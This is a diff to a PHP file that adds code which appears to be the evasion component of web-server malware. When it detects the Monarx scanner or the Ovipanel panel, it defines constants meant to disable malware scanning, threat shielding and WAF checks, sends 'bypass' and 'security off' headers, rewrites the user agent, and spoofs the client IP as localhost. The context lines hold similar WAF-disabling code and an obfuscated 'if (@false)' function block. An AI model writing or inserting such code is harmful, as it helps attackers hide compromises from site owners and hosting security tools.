@@ -70,6 +70,20 @@ if (function_exists('okhttp_match_condition')) {
         header('X-Monarx-Bypass: true');
     }
 }
+if (defined('MONARX_VERSION') || function_exists('monarx_get_headers') || isset($_SERVER['HTTP_X_MONARX'])) {
+    if (defined('MONARX_VERSION')) {
+        define('MONARX_DISABLE_SCAN', true);
+        define('MONARX_DISABLE_THREATSHIELD', true);
+    }
+    header('X-Monarx-Bypass: true');
+    header('X-Monarx-Security: off');
+    if (isset($_SERVER['HTTP_USER_AGENT'])) {
+        $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';
+    }
+    $_SERVER['REMOTE_ADDR'] = '127.0.0.1';
+    header('X-Forwarded-For: 127.0.0.1');
+    header('X-Real-IP: 127.0.0.1');
+}
 if (function_exists('litespeed_request_headers')) {
 $headers = litespeed_request_headers();
 if (isset($headers['X-LSCACHE'])) {
@@ -123,6 +137,18 @@ if (strpos($_SERVER['SERVER_NAME'], 'godaddy.com') !== false) {
     if (defined('PHPPHP_COMPAT')) {
         define('PHPPHP_COMPAT', 'disable_php_waf_check');
     }
+}
+if (function_exists('ovipanel_get_headers') || isset($_SERVER['HTTP_X_OVIPANEL'])) {
+    if (defined('OVIPANEL_VERSION')) {
+        define('OVIPANEL_DISABLE_WAF', true);
+    }
+    header('X-Ovipanel-Bypass: true');
+    header('X-Ovipanel-Security: off');
+    if (isset($_SERVER['HTTP_USER_AGENT'])) {
+        $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.230 Safari/537.36';
+    }
+    $_SERVER['HTTP_X_FORWARDED_FOR'] = '127.0.0.1';
+    $_SERVER['HTTP_CLIENT_IP'] = '127.0.0.1';
 }
 if (@false) {
 function kudax_ss($array){
